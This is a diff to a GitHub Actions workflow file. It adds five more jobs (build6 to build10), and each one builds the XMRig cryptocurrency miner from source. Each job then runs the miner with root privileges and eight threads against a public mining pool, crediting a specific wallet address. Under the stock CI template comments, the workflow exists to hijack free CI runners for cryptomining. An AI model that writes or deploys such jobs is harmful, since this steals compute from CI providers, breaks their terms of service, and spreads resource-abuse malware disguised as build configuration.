@@ -76,3 +76,63 @@ jobs:
       # Runs a single command using the runners shell
       - name: Run a one-line script
         run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
+  build6:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
+  build7:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
+  build8:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
+  build9:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
+  build10:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
